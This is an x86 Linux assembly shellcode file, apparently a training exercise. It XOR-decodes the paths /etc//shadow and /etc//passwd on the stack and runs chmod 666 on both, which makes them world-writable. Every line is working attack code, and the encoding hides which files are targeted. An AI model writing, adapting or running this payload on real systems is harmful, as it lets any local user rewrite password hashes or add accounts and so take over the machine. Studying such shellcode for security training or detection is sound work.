; Filename: rolling_XOR_decoder.nasm
; Author: wfscs3

global _start

section .text
_start:

	xor eax, eax 			; Clear eax
	push eax 				; Push 0 to the stack

;	push dword 0x776f6461 	; Push XORed (with aa) FILEPATH args to the stack
	push dword 0xddc5cecb
;	push dword 0x68732f2f
	push dword 0xc2d98585
;	push dword 0x6374652f
	push dword 0xc9decf85

	mov cl, 0xc				; Set first loop counter to size data pushed (12) bytes)
	mov esi, 0x2			; Set iteration counter to 2

l1:							; Loop function
	dec cl					; Decrement loop counter					
	mov dl, [esp+ecx]		; Move stack pounter + counter to dl
	xor dl, 0xaa			; XOR dl with value (aa)
	mov [esp+ecx], dl		; Move value back to stack + offset.
	cmp cl, 0x0				; compare cl with
	jne l1 					; Jump back to loop if not 0

	mov cx, 0x1b6 			; Set EXC to (666) octal for permissions arguments
	mov ebx, esp 			; Pointer for FILE arguments in ebx
	mov al, 0xf 			; Set sys_chmod in EAX 
	int 0x80

	xor eax, eax			; Clear eax
	push eax				; Push 0x0 to stack

	dec esi 				; Decrement iteration counter
	jz exit 				; Jump down to sys_exit if zero

;	push dword 0x64777373   ; Push next FILEPATH args to the stack
	push dword 0xceddd9d9
;	push dword 0x61702f2f
	push dword 0xcbda8585
;	push dword 0x6374652f
	push dword 0xc9decf85

	xor ecx, ecx
	mov cl, 0xc				; Set loop counter back to 12 bytes.
	jmp l1 					; jump to the loop for XORing

exit: 						; Exit funciton
	xor eax, eax 			; Clear eax
	inc eax 				; Increment eax to 0x01 dor sys_exit
	int 0x80





